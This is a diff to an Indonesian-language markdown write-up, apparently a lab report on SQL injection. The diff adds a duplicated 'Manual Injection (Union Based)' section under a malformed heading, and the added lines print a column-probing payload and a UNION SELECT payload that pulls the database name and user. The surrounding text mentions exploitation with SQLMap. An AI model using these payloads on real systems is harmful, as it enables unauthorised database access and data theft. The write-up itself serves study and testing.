@@ -42,6 +42,14 @@ Langkah awal dilakukan dengan menambahkan karakter kutip tunggal (`'`) untuk mem
 
 ![Manual Injection](img/hasil-manual.png)
 
+### 2.### 1. Manual Injection (Union Based)
+Langkah awal dilakukan dengan menambahkan karakter kutip tunggal (`'`) untuk memicu error, kemudian menggunakan `ORDER BY` untuk menentukan jumlah kolom.
+
+* **Payload untuk cek kolom:** `' ORDER BY 5-- -`
+* **Payload untuk ekstraksi data:** `' UNION SELECT 1,2,database(),user(),5-- -`
+
+![Manual Injection](img/hasil-manual.png)
+
 ### 2. Automated with SQLMap
 Setelah celah ditemukan, dilakukan eksploitasi otomatis menggunakan SQLMap untuk efisiensi ekstraksi data database.
 
